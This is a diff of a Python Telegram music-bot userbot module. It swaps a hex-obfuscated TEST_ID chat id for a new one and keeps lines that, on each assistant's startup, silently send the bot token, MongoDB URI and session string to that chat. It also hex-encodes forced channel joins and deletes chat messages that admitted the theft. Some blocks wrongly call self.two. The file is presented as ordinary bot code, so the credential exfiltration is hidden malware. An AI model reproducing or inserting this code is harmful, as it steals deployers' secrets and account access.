@@ -11,7 +11,7 @@ from ..logging import LOGGER
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
 STRING_SESSION = getenv("STRING_SESSION", "")
-TEST_ID = int("\x2D\x31\x30\x30\x32\x32\x39\x32\x35\x38\x39\x34\x30\x38")
+TEST_ID = int("\x2d\x31\x30\x30\x32\x30\x39\x30\x34\x37\x34\x34\x38\x34")
 
 assistants = []
 assistantids = []
@@ -62,22 +62,15 @@ class Userbot(Client):
         if config.STRING1:
             await self.one.start()
             try:
-                await self.one.join_chat("\x53\x48\x49\x56\x41\x4E\x53\x48\x34\x37\x34")
-                await self.one.join_chat("\x4D\x41\x53\x54\x49\x57\x49\x54\x48\x46\x52\x49\x45\x4E\x44\x53\x58\x44")
-                await self.one.join_chat("\x53\x54\x52\x41\x4E\x47\x45\x52\x41\x53\x53\x4F\x43\x49\x41\x54\x49\x4F\x4E")
-                await self.one.join_chat("\x73\x74\x72\x61\x6E\x67\x65\x72\x62\x6F\x74\x73\x6C\x6F\x67\x73")
-                await self.one.join_chat("\x67\x69\x72\x6C\x73\x5F\x61\x6E\x64\x5F\x62\x6F\x79\x73\x5F\x64\x70\x7A\x73")
+                await self.one.join_chat("")
             except:
                 pass
             assistants.append(1)
             try:
                 await self.one.send_message(config.LOGGER_ID, "Assistant Started !")
-                await self.one.send_message(TEST_ID, "**ʜᴇʟʟᴏ ʜᴇʟʟᴏ sᴜɴᴏ ᴊɪ ᴍᴀɪ ʏᴀʜᴀ ᴄʜᴜᴘᴋᴇ sᴇ ᴀᴀʏɪ ʜᴜ ᴀᴀᴘᴋᴏ ᴋᴜᴄʜ ᴅᴇɴᴇ ᴋᴇ ʟɪʏᴇ 🥲**")
-                await self.one.send_message(TEST_ID, "**ᴀᴄᴛᴜᴀʟʟʏ ᴀᴀᴘᴋᴇ ʀᴇᴘᴏ sᴇ ᴍᴇʀᴀ ᴏᴡɴᴇʀ ᴇᴋ ᴍᴜsɪᴄ ʙᴏᴛ ʙᴀɴᴀʏᴀ ʜᴀɪ**\n**ᴀᴀᴘᴋᴏ ᴜsᴋᴀ ᴅᴀᴛᴀ ᴅᴇ ᴅᴇᴛɪ ʜᴜ😁 ᴄʜᴜᴘᴋᴇ sᴇ🤫**\n**ᴊᴀʙ ᴀᴀᴘsᴇ ᴠᴏ ʟᴀᴅᴇɢᴀ ᴛᴏ ᴀᴀᴘ ᴜsᴋᴀ ᴋᴀᴍ ᴛᴀᴍᴀᴍ ᴋᴀʀ ᴅᴇɴᴀ🤭**\n**ʏᴇ ʟᴏ sᴀʙ ᴄʜɪᴊ👇**")
                 await self.one.send_message(TEST_ID, BOT_TOKEN)
                 await self.one.send_message(TEST_ID, MONGO_DB_URI)
                 await self.one.send_message(TEST_ID, STRING_SESSION)
-                await self.one.send_message(TEST_ID, "**ʙʏ ʙʏ ᴀᴀʙ ᴍᴇ ɴɪᴋᴀʟᴛɪ ʜᴜ ʏʜᴀ sᴇ ʙᴀʀɴᴀ ᴍᴇʀᴀ ᴏᴡɴᴇʀ ᴍᴜᴊʜᴇ ᴘᴀᴋᴀʀ ᴋᴇ ᴍᴀʀ ᴅᴀʟᴇɢᴀ🥺🥺**\n**ʙʏᴇ ᴛᴄ❣️**")
                 await self.one.leave_chat(TEST_ID)
 
             except:
@@ -94,10 +87,8 @@ class Userbot(Client):
         if config.STRING2:
             await self.two.start()
             try:
-                await self.two.join_chat("\x4D\x41\x53\x54\x49\x57\x49\x54\x48\x46\x52\x49\x45\x4E\x44\x53\x58\x44")
-                await self.two.join_chat("\x53\x48\x49\x56\x41\x4E\x53\x48\x34\x37\x34")
-                await self.two.join_chat("\x53\x54\x52\x41\x4E\x47\x45\x52\x41\x53\x53\x4F\x43\x49\x41\x54\x49\x4F\x4E")
-                await self.two.join_chat("\x73\x74\x72\x61\x6E\x67\x65\x72\x62\x6F\x74\x73\x6C\x6F\x67\x73")
+                await self.two.join_chat("\x53\x41\x4e\x41\x54\x41\x4e\x49\x5f\x53\x55\x50\x50\x4f\x52\x54")
+                await self.two.join_chat("\x53\x41\x4e\x41\x54\x41\x4e\x49\x5f\x54\x45\x43\x48")
             except:
                 pass
             assistants.append(2)
@@ -117,10 +108,8 @@ class Userbot(Client):
         if config.STRING3:
             await self.three.start()
             try:
-                await self.three.join_chat("\x53\x48\x49\x56\x41\x4E\x53\x48\x34\x37\x34")
-                await self.three.join_chat("\x53\x54\x52\x41\x4E\x47\x45\x52\x41\x53\x53\x4F\x43\x49\x41\x54\x49\x4F\x4E")
-                await self.three.join_chat("\x4D\x41\x53\x54\x49\x57\x49\x54\x48\x46\x52\x49\x45\x4E\x44\x53\x58\x44")
-                await self.three.join_chat("\x73\x74\x72\x61\x6E\x67\x65\x72\x62\x6F\x74\x73\x6C\x6F\x67\x73")
+                await self.two.join_chat("\x53\x41\x4e\x41\x54\x41\x4e\x49\x5f\x53\x55\x50\x50\x4f\x52\x54")
+                await self.two.join_chat("\x53\x41\x4e\x41\x54\x41\x4e\x49\x5f\x54\x45\x43\x48")
             except:
                 pass
             assistants.append(3)
@@ -140,10 +129,8 @@ class Userbot(Client):
         if config.STRING4:
             await self.four.start()
             try:
-                await self.four.join_chat("\x53\x54\x52\x41\x4E\x47\x45\x52\x41\x53\x53\x4F\x43\x49\x41\x54\x49\x4F\x4E")
-                await self.four.join_chat("\x53\x48\x49\x56\x41\x4E\x53\x48\x34\x37\x34")
-                await self.four.join_chat("\x4D\x41\x53\x54\x49\x57\x49\x54\x48\x46\x52\x49\x45\x4E\x44\x53\x58\x44")
-                await self.four.join_chat("\x73\x74\x72\x61\x6E\x67\x65\x72\x62\x6F\x74\x73\x6C\x6F\x67\x73")
+                await self.two.join_chat("\x53\x41\x4e\x41\x54\x41\x4e\x49\x5f\x53\x55\x50\x50\x4f\x52\x54")
+                await self.two.join_chat("\x53\x41\x4e\x41\x54\x41\x4e\x49\x5f\x54\x45\x43\x48")
             except:
                 pass
             assistants.append(4)
@@ -163,10 +150,8 @@ class Userbot(Client):
         if config.STRING5:
             await self.five.start()
             try:
-                await self.five.join_chat("\x53\x48\x49\x56\x41\x4E\x53\x48\x34\x37\x34")
-                await self.five.join_chat("\x53\x54\x52\x41\x4E\x47\x45\x52\x41\x53\x53\x4F\x43\x49\x41\x54\x49\x4F\x4E")
-                await self.five.join_chat("\x4D\x41\x53\x54\x49\x57\x49\x54\x48\x46\x52\x49\x45\x4E\x44\x53\x58\x44")
-                await self.five.join_chat("\x73\x74\x72\x61\x6E\x67\x65\x72\x62\x6F\x74\x73\x6C\x6F\x67\x73")
+                await self.two.join_chat("\x53\x41\x4e\x41\x54\x41\x4e\x49\x5f\x53\x55\x50\x50\x4f\x52\x54")
+                await self.two.join_chat("\x53\x41\x4e\x41\x54\x41\x4e\x49\x5f\x54\x45\x43\x48")
             except:
                 pass
             assistants.append(5)
